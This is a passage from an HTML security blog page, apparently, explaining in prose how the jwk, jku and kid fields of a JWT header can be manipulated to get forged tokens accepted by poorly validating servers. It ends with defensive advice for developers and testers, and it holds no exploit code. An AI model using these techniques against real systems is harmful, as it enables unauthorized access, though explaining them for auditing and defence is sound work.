            </ul>

            <h4>JWT Header Parameter Injections – A Closer Look</h4>
            <p>According to the JWS (JSON Web Signature) specification, the only required field in a JWT (JSON Web Token) header is the alg parameter, which defines the cryptographic algorithm used to sign the token. However, in real world applications, JWT headers also known as JOSE headers often include additional fields. Some of these are particularly interesting from a security standpoint, especially because they can be influenced by the end user</p>
            <p>Here are a few commonly used JWT header parameters that can be exploited if not properly validated:</p>
            <ul>
                <li><strong>jwk (JSON Web Key):</strong> This parameter embeds a public key directly into the JWT header as a JSON object. If accepted without validation, it allows the attacker to specify which key the server should use to verify the signature.</li>
                <li><Strong>jku (JSON Web Key Set URL):</Strong>This parameter provides a URL that points to a JSON Web Key Set (JWKS). A vulnerable server might fetch a malicious key set from an attacker-controlled domain and use one of those keys to validate the token.</li>
                <li><Strong>kid (Key ID):</Strong> This parameter helps the server select the correct key from a set of possible keys. Attackers can manipulate kid to influence which key the server uses, potentially matching it with a key they control.</li>
            </ul>
            <p>In each case, these header fields give the attacker an opportunity to influence the key selection process during signature verification. If the server does not enforce strict validation such as checking the source of a jku, verifying the integrity of a jwk, or constraining acceptable kid values it may end up accepting a forged token.</p>
            <p>JWT header injection attacks exploit weak assumptions in how a server selects and trusts cryptographic keys. For developers and penetration testers alike, it's crucial to understand these parameters, audit their usage, and ensure robust validation mechanisms are in place to prevent unauthorized access.</p>
        </div>
    </div>

    <script>
        function togglePost(post) {
            let allPosts = document.querySelectorAll(".post");

            allPosts.forEach(p => {
                if (p !== post) {
                    p.classList.remove("expanded");
                }
            });

            post.classList.toggle("expanded");
        }

        function closePost(event, closeButton) {
            event.stopPropagation();
            let post = closeButton.parentElement;
            post.classList.remove("expanded");
        }
    </script>

</body>
</html>
